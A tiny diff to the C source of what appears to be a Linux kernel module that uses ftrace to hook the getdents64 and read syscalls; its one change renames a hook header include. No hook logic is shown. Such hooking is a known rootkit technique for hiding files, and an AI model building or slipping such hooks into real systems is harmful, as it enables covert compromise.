@@ -4,7 +4,7 @@
 #include <linux/kobject.h>
 
 #include "utils/ftrace_utils.h"
-#include "hooks/x64_sys_getdents.h"
+#include "hooks/x64_sys_getdents64.h"
 #include "hooks/x64_sys_read.h"
 
 // define which functions to hook
